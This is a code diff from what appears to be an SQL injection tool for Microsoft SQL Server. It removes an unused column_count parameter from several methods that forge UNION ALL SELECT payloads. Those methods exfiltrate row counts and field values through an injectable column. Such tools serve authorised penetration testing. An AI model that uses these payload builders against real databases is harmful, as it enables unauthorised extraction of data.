@@ -161,14 +161,14 @@ class SQLServerMole(DbmsMole):
     def _join_fields_with_table(self, fields, table):
         return list(map(lambda i: table.split(',')[0] + '.' + i, fields))
 
-    def forge_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
+    def forge_count_query(self, fields, table_name, injectable_field, where = "1=1"):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = (SQLServerMole.out_delimiter + '+cast(count(*) as varchar(50))+' + SQLServerMole.out_delimiter)
         query += ','.join(query_list)
         return query + " from " + table_name + " where " + self.parse_condition(where)
 
-    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_query(self, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = (SQLServerMole.out_delimiter + "+" + self._concat_fields(fields) + "+" + SQLServerMole.out_delimiter)
@@ -181,7 +181,7 @@ class SQLServerMole(DbmsMole):
                       where + " order by 1 ASC) and " + where + " order by 1 ASC) as T")
         return query
 
-    def forge_integer_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
+    def forge_integer_count_query(self, fields, table_name, injectable_field, where = "1=1"):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ('cast(cast('+SQLServerMole.integer_out_delimiter +
@@ -192,7 +192,7 @@ class SQLServerMole(DbmsMole):
             query += " from " + table_name + " where " + self.parse_condition(where)
         return query
 
-    def forge_integer_len_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_integer_len_query(self, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast(cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10))+" +
@@ -207,7 +207,7 @@ class SQLServerMole(DbmsMole):
                       where + " order by 1 ASC) and " + where + " order by 1 ASC) as T")
         return query
 
-    def forge_integer_query(self, column_count, index, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_integer_query(self, index, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast(cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10))+" +
